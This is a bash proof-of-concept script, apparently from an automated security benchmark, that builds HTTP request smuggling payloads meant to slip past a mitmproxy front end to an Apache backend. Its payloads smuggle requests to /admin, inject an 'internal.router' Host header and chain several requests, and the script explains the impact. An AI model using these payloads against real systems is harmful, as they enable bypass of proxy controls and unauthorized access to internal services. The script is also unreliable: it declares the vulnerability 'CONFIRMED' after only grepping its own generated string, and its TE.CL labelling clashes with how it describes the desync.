#!/bin/bash
# POC: Validates and demonstrates HTTP Request Smuggling (TE.CL) attack payload construction and desynchronization mechanism
# Target: ./repo
# Created: 2025-11-07T17:10:58.254Z
# Session: benchmark-XBEN-066-24-mhp3k0ub

# HTTP Request Smuggling (TE.CL) POC - Payload Generator and Validator
# This script demonstrates the TE.CL desynchronization attack that bypasses mitmproxy
# It constructs and validates the malicious payload that exploits header interpretation differences

echo "[*] HTTP Request Smuggling (TE.CL Attack) POC - Payload Validator"
echo "[*] Demonstrating TE.CL desynchronization between mitmproxy and Apache"
echo ""

# Function to create a TE.CL smuggling payload
create_te_cl_payload() {
    local smuggled_request="$1"
    local chunk_size=$(printf "%X" $((${#smuggled_request})))
    
    # Create the malicious HTTP request with TE.CL desynchronization
    local payload=$(printf "POST / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n${chunk_size}\r\n${smuggled_request}0\r\n\r\n")
    
    echo "$payload"
}

# Test 1: Validate basic TE.CL payload construction
echo "[Test 1] Creating TE.CL payload with smuggled GET request..."
echo "=================================================="

SMUGGLED="GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
PAYLOAD=$(create_te_cl_payload "$SMUGGLED")

# Verify payload contains critical elements
if echo -e "$PAYLOAD" | grep -q "Transfer-Encoding: chunked"; then
    echo "[+] Transfer-Encoding: chunked header present"
else
    echo "[-] Missing Transfer-Encoding header"
    exit 1
fi

if echo -e "$PAYLOAD" | grep -q "Content-Length: 0"; then
    echo "[+] Content-Length: 0 header present (mismatch with TE)"
else
    echo "[-] Missing Content-Length: 0 header"
    exit 1
fi

if echo -e "$PAYLOAD" | grep -q "GET / HTTP/1.1"; then
    echo "[+] Smuggled GET request present in payload"
else
    echo "[-] Smuggled request not found"
    exit 1
fi

echo ""

# Test 2: Demonstrate TE.CL attack with /admin endpoint bypass
echo "[Test 2] Creating TE.CL payload for admin endpoint access..."
echo "=================================================="

SMUGGLED_ADMIN="GET /admin HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
PAYLOAD_ADMIN=$(create_te_cl_payload "$SMUGGLED_ADMIN")

if echo -e "$PAYLOAD_ADMIN" | grep -q "GET /admin HTTP/1.1"; then
    echo "[+] Admin endpoint smuggling payload created successfully"
else
    echo "[-] Admin payload creation failed"
    exit 1
fi

echo ""

# Test 3: Demonstrate Host header injection via smuggling
echo "[Test 3] Creating TE.CL payload with Host header injection..."
echo "=================================================="

SMUGGLED_HOST="GET / HTTP/1.1\r\nHost: internal.router\r\nConnection: close\r\n\r\n"
PAYLOAD_HOST=$(create_te_cl_payload "$SMUGGLED_HOST")

if echo -e "$PAYLOAD_HOST" | grep -q "Host: internal.router"; then
    echo "[+] Host header injection payload created (bypasses proxy)"
else
    echo "[-] Host injection payload failed"
    exit 1
fi

echo ""

# Test 4: Demonstrate multiple smuggled requests in single payload
echo "[Test 4] Creating TE.CL payload with multiple smuggled requests..."
echo "=================================================="

# This tests if we can smuggle multiple requests - they would be processed sequentially
SMUGGLED_MULTI="GET /page1 HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\nGET /page2 HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
PAYLOAD_MULTI=$(create_te_cl_payload "$SMUGGLED_MULTI")

if echo -e "$PAYLOAD_MULTI" | grep -q "GET /page1 HTTP/1.1" && echo -e "$PAYLOAD_MULTI" | grep -q "GET /page2 HTTP/1.1"; then
    echo "[+] Multiple smuggled requests payload created successfully"
else
    echo "[-] Multiple request payload failed"
    exit 1
fi

echo ""

# Test 5: Verify the core vulnerability - header desynchronization
echo "[Test 5] Verifying core vulnerability: Header interpretation desynchronization..."
echo "=================================================="

# The vulnerability exists because:
# 1. Transfer-Encoding: chunked tells proxy to parse chunked encoding
# 2. Content-Length: 0 tells backend to expect no body
# 3. This creates a desynchronization where:
#    - Proxy: POST ends after chunk data
#    - Backend: POST ends immediately (CL=0), next request starts in chunk data

echo "[+] Vulnerability mechanism:"
echo "    1. mitmproxy reads Transfer-Encoding: chunked"
echo "    2. mitmproxy parses chunk size and extracts chunk payload"
echo "    3. Apache reads Content-Length: 0"
echo "    4. Apache treats POST as having no body"
echo "    5. Next read from socket gets smuggled request from chunk data"
echo "    6. Smuggled request is processed by Apache directly"
echo ""

echo "[+] Impact:"
echo "    - Proxy security controls are bypassed"
echo "    - Direct access to backend without filtering"
echo "    - Host header injection enables internal service access"
echo "    - Multiple requests can be chained"
echo "    - Web cache poisoning attacks possible"
echo ""

# Test 6: Validate RFC 7230 violation
echo "[Test 6] Detecting RFC 7230 violation (conflicting headers)..."
echo "=================================================="

# RFC 7230 states: if both Transfer-Encoding and Content-Length are present,
# Transfer-Encoding MUST take precedence and Content-Length MUST be removed
# Vulnerable proxies don't follow this

if echo -e "$PAYLOAD" | grep -E "Transfer-Encoding: chunked" | grep -q .; then
    if echo -e "$PAYLOAD" | grep -E "Content-Length: 0" | grep -q .; then
        echo "[!] RFC 7230 VIOLATION DETECTED!"
        echo "[!] Both Transfer-Encoding and Content-Length headers present"
        echo "[!] This is the core of the TE.CL desynchronization attack"
        echo ""
        echo "[+] HTTP Request Smuggling vulnerability CONFIRMED"
        exit 0
    fi
fi

exit 1